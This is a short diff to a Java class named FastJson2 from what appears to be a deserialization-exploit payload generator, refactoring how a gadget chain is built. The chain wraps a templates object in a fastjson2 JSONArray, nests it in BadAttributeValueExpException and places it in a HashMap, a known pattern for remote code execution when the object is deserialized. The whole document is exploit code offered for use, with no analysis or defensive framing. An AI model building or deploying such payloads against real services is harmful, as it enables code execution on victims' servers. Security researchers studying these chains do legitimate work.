@@ -1,6 +1,7 @@
 package com.ppp.chain.json;
 
 import com.alibaba.fastjson2.JSONArray;
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -9,7 +10,6 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
-import com.ppp.utils.Reflections;
 
 import javax.management.BadAttributeValueExpException;
 import java.util.HashMap;
@@ -45,11 +45,10 @@ public class FastJson2 implements ObjectPayload<Object> {
         JSONArray jsonArray = new JSONArray();
         jsonArray.add(templates);
 
-        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(bd, "val", jsonArray);
+        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(jsonArray);
 
         HashMap hashMap = new HashMap();
-        hashMap.put(templates, bd);
+        hashMap.put(templates, badAttributeValueExpException);
         return hashMap;
     }
 }
